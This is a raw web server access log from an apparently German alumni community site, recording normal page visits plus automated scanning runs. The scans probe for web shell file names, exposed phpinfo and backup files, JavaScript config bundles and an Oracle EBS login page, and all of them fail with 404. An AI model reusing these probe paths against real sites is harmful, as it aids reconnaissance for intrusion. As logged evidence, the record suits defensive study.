bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:13;;/10.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:14;;/11.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:15;;/12.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:16;;/13.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:17;;/hi.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:18;;/v.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:19;;/ar.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:19;;/article.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:20;;/install.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:21;;/1.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:22;;/bak.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:23;;/ini.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:24;;/mail.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:24;;/dlu.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:25;;/zde.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:26;;/ifm.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:27;;/redi.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:28;;/fns.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:29;;/pent.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:29;;/wsx.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:30;;/r79.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:31;;/mpxct.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:32;;/x3.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:33;;/wan.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:34;;/iov.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:35;;/ouh.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:36;;/asgtt.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:36;;/image.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:37;;/wok.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:38;;/alexus.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:39;;/sadis.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:40;;/admir.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:41;;/file52.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:42;;/133.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:43;;/x0.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:43;;/wsr2.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:44;;/wolv.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:45;;/av.php.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:46;;/pn.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:47;;/error.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:48;;/NH19T66T.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:49;;/rei.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:50;;/666.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:51;;/777.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:52;;/888.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:52;;/555.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:53;;/zeal.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:54;;/file.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:55;;/file5.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:56;;/file17.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:57;;/file32.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:58;;/file13.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:34:59;;/file3.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:35:00;;/atomlib.php;GET;404
bd54951b3865ffa2d3e63b3c83e87b6f8540fb0f6eda7b3518baa8b1c91e8e64;2025-11-06 11:35:01;;/manager.php;GET;404
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-06 11:39:49;;/;GET;200
21e88bf2a6399c14c5eb5c0b0bb3137575c87db812aa03aed8d7e0a7cc3f2b91;2025-11-06 11:47:18;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
e8b3eefc24fd73bd60d872b5caa2c3a26caa3d4066ca09240104eeecc5a7b138;2025-11-06 12:04:29;/;/;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-06 12:05:08;/;/;GET;200
489b201b631459bf8c1f12e2a4cd7073e48cdb0ed2e48ab55547ca9fa26cba02;2025-11-06 12:06:12;;/gruppen/hobby/fitness;GET;200
9090c6b282d915802e9c34e29899611fea91454f5025a5f96384fff297093e3b;2025-11-06 12:22:21;;/gruppen/hobby/diy-projekte;GET;200
7b5512ad1a6b9fe721a1e078551f4bed6a8396516578382aeeb7437db11e3971;2025-11-06 12:38:33;;/gruppen/hobby/biologie;GET;200
abbc0792664e36cb8c4c776d2519179e13d69c9403070633ae2554dc0d70e171;2025-11-06 12:41:03;;/OA_HTML/AppsLocalLogin.jsp;GET;404
9220a0f306fafee907ae21cbaa3dc18ee1f84e2f1890016e1ea9feaeb336135e;2025-11-06 12:54:13;;/themen?category=kultur;GET;200
1879e9fcc26140740009fa26bcb8d37bb16d8b388eb16ab887982812f570c31e;2025-11-06 12:58:56;;/;GET;200
6a597af15cac5754dd91a1c32477527d9f6b93d276cea5a899ddcc934e374c96;2025-11-06 13:00:28;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-06 13:04:03;/personen/all/3;/personen/alumni/details/sebastian-langhorst;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-06 13:05:17;/personen/alumni/schule/09A05;/veranstaltungen/details/wohnzimmerkonzert;GET;200
501914f4d0f80a1e90396bc5659feeb72b4cd140b39dfddcf88bcf30e762c742;2025-11-06 13:05:49;;/;GET;200
c47e91b15039dc45854d403740948a0cc410082c4781ad7f3dc6d844e2b3eeb0;2025-11-06 13:10:47;;/?page=docs-uml-_index.md;GET;200
5877cd8959be301e27b0a56239ed18179e7968ecea6d9685dd5f2812b98be2d0;2025-11-06 13:11:26;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
7e239de8a2e225daef6cc1bfff93d2a596ada3f7a3650d20c19ca6c426137f2a;2025-11-06 13:11:34;;/personen/alumni/schule/185826;GET;200
501914f4d0f80a1e90396bc5659feeb72b4cd140b39dfddcf88bcf30e762c742;2025-11-06 13:11:57;;/webui/;GET;404
501914f4d0f80a1e90396bc5659feeb72b4cd140b39dfddcf88bcf30e762c742;2025-11-06 13:18:01;;/;GET;200
5270a16d7888b13c2459a59d3e6cb5ff017fbfa2df67c0519ef9c31b907a76fe;2025-11-06 13:18:01;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
ec917c57c5a6bf2ba88ffee565f901bdab5b22a79073d5c2ab9ee5a95d16bef4;2025-11-06 13:18:06;;/;GET;200
f2c44f408714163a75b7c2755b388b42f002c36d096a982730ffee39cf72076e;2025-11-06 13:23:44;;/personen/alumni/details/benjamin-voigt;GET;200
7138251d030c871f10ed52bb523df518b5e4ae537c979e9557c055f032718911;2025-11-06 13:23:48;;/;GET;200
52eb532781eb35a8f6d089edc0af872e667bbeba422d0ef79fbf1409780eddab;2025-11-06 13:27:37;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:47:50;/;/;GET;200
4c04c34e74f16472f0b6445763a23b7454bcca63febb0d748e5a4bd435d6bc37;2025-11-06 13:48:02;;/gruppen/hobby/einzelsportarten;GET;200
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:45;/;/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:46;/;/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:47;/;/php_info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:50;/;/phpinfo;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:52;/;/test.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:54;/;/info1.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:56;/;/info2.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:57;/;/php.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:57;/;/pi.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:58;/;/i.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:59;/;/phpversion.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:48:59;/;/php_version.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:00;/;/serverinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:00;/;/server.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:01;/;/debug.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:02;/;/diagnostic.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:02;/;/phptest.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:03;/;/check.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:04;/;/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:04;/;/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:05;/;/php_info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:05;/;/test.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:06;/;/phpinfo.php.bak;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:06;/;/info.php.bak;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:07;/;/php_info.php.bak;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:07;/;/test.php.bak;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:08;/;/phpinfo.php.old;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:09;/;/info.php.old;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:10;/;/php_info.php.old;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:10;/;/test.php.old;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:11;/;/phpinfo.php.orig;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:12;/;/info.php.orig;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:12;/;/php_info.php.orig;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:13;/;/test.php.orig;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:13;/;/phpinfo.php.backup;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:14;/;/info.php.backup;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:15;/;/php_info.php.backup;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:15;/;/test.php.backup;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:16;/;/phpinfo.php~;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:17;/;/info.php~;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:18;/;/php_info.php~;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:19;/;/test.php~;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:19;/;/phpinfo.php.swp;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:20;/;/info.php.swp;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:20;/;/php_info.php.swp;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:21;/;/test.php.swp;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:22;/;/phpinfo.php.tmp;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:22;/;/info.php.tmp;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:23;/;/php_info.php.tmp;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:23;/;/test.php.tmp;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:24;/;/admin/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:25;/;/admin/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:25;/;/admin/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:26;/;/admin/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:26;/;/test/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:27;/;/test/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:27;/;/test/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:28;/;/test/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:28;/;/dev/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:29;/;/dev/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:29;/;/dev/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:30;/;/dev/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:30;/;/tmp/phpinfo.php;GET;404
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-06 13:49:31;/gruppen/hobby/tanzen;/gruppen/hobby/tanzen;GET;200
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:31;/;/tmp/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:32;/;/tmp/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:32;/;/tmp/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:33;/;/includes/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:33;/;/includes/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:34;/;/includes/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:35;/;/includes/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:35;/;/scripts/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:36;/;/scripts/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:36;/;/scripts/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:37;/;/scripts/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:42;/;/public/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:42;/;/public/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:43;/;/public/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:43;/;/public/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:44;/;/web/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:44;/;/web/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:45;/;/web/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:46;/;/web/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:46;/;/www/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:47;/;/www/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:47;/;/www/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:48;/;/www/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:48;/;/site/phpinfo.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:49;/;/site/info.php;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:50;/;/site/phpinfo.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:50;/;/site/info.php.save;GET;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:52;/;/;GET;200
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:53;/;/js/app.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:53;/;/js/main.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:54;/;/js/config.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:55;/;/js/settings.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:55;/;/js/constants.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:56;/;/js/bundle.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:57;/;/js/vendor.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:58;/;/js/runtime.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:59;/;/js/chunk.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:49:59;/;/js/webpack.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:00;/;/app.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:00;/;/main.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:01;/;/bundle.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:02;/;/config.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:02;/;/settings.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:03;/;/vendor.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:04;/;/runtime.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:05;/;/constants.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:05;/;/env.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:06;/;/api.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:07;/;/assets/js/app.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:07;/;/assets/js/main.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:08;/;/assets/js/bundle.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:09;/;/assets/js/vendor.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:09;/;/assets/js/config.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:10;/;/assets/app.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:10;/;/assets/main.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:11;/;/assets/bundle.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:12;/;/assets/config.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:12;/;/assets/settings.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:13;/;/assets/runtime.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:14;/;/assets/chunk.js;HEAD;404
88094e8a50f839e0e2eee439c23f600cc57c96131f1f00985f22e5044fd32cf2;2025-11-06 13:50:15;/;/assets/webpack.js;HEAD;404
